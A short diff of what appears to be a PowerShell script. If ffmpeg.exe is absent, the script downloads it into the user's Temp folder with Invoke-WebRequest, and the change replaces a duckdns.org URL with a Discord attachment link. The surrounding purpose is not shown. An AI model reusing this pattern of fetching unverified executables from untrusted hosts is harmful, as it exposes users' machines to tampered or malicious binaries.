@@ -20,7 +20,7 @@ param ([int[]]$t)
 $Path = "$env:Temp\ffmpeg.exe"
 
 If (!(Test-Path $Path)){  
-$url = "http://beigenet.duckdns.org/files/Win10Tools/ffmpeg.exe"
+$url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
 iwr -Uri $url -OutFile $Path
 }
 
